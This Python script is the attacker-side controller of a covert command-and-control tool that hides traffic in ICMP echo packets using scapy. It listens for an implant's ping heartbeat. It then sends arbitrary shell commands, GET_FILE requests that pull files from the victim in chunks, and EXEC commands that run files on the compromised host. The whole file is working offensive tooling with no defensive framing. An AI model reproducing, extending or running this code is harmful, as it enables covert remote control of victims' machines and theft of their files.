#!/usr/bin/env python3
import os
import sys
from scapy.all import *
from scapy.layers.inet import IP, ICMP

# Global variables
agent_ip = None  # Placeholder for agent IP
received_file_path = "received_file"  # File path for received files


def wait_for_heartbeat():
    """
    Waits for the heartbeat from the agent and retrieves the agent's IP.
    """
    global agent_ip
    print("Waiting for heartbeat from agent...")
    rx = sniff(filter="icmp and icmp[0] == 8", count=1, timeout=10)
    if rx:
        agent_ip = rx[0][IP].src
        print(f"Heartbeat received from agent at {agent_ip}.")
    else:
        print("No heartbeat received. Retrying...")


def send_command(command):
    """
    Sends a command to the agent.
    """
    if agent_ip:
        print(f"Sending command: {command}")
        packet = IP(dst=agent_ip) / ICMP(type="echo-request", id=0x0001, seq=0x1) / Raw(load=command)
        send(packet, verbose=False)
        print("Command sent.")
    else:
        print("Agent IP not available. Cannot send command.")


def receive_file():
    """
    Receives a file from the agent in chunks and saves it locally.
    """
    if agent_ip:
        print("Receiving file chunks from agent...")
        with open(received_file_path, "wb") as f:
            while True:
                rx = sniff(filter=f"icmp and src {agent_ip} and icmp[0] == 0", count=1, timeout=5)
                if rx and Raw in rx[0]:
                    chunk = rx[0][Raw].load
                    if chunk == b"END_OF_FILE":
                        print("File transfer complete.")
                        break
                    f.write(chunk)
                    print(f"Received chunk (size: {len(chunk)} bytes)")

                    # Send acknowledgment
                    ack_packet = IP(dst=agent_ip) / ICMP(type="echo-request", id=0x0001, seq=0x1) / Raw(load=b"ACK")
                    send(ack_packet, verbose=False)
                else:
                    print("No more chunks received. Exiting file transfer.")
                    break
        print(f"File saved as: {received_file_path}")
    else:
        print("Agent IP not available. Cannot receive file.")


def receive_response():
    """
    Receives the response from the agent for a command.
    """
    if agent_ip:
        print("Waiting for response from agent...")
        rx = sniff(filter=f"icmp and src {agent_ip} and icmp[0] == 0", count=1, timeout=10)
        if rx and Raw in rx[0]:
            response = rx[0][Raw].load.decode('utf-8', errors='ignore')
            print(f"Response from agent:\n{response}")
        else:
            print("No response received from agent.")
    else:
        print("Agent IP not available. Cannot receive response.")


def main():
    """
    Main function to handle the attacker's operations.
    """
    global received_file_path

    while True:
        # Wait for the agent's heartbeat
        wait_for_heartbeat()

        if not agent_ip:
            print("Failed to detect agent IP. Exiting...")
            sys.exit(1)

        # Display menu for the attacker
        print("\nAvailable commands:")
        print("1. GET_FILE:<file_path> - Request a file from the agent")
        print("2. [Any other command] - Execute a shell command on the agent")
        print("3. EXIT - Exit the program")
        print("4. EXEC:")

        command = input("\nEnter your command: ").strip()

        # Exit the program
        if command.upper() == "EXIT":
            print("Exiting...")
            break

        # Handle file transfer
        if command.startswith("GET_FILE:"):
            # Extract file name for saving
            requested_file = os.path.basename(command.split(":", 1)[1])
            received_file_path = f"received_{requested_file}"
            print(f"Requested file will be saved as: {received_file_path}")

            # Send the file request command
            send_command(command)

            # Receive the file
            receive_file()

        elif command.startswith("EXEC:"):
            file_path = command.split(":", 1)[1]
            print(f"Sending EXEC command to execute {file_path} on the victim...")
            send(IP(dst=agent_ip)/ICMP(type="echo-request", id=0x0001, seq=0x1)/Raw(load=f"EXEC:{file_path}"), verbose=False)
            print("EXEC command sent.")

        # Handle other commands
        else:
            send_command(command)
            receive_response()


if __name__ == "__main__":
    main()
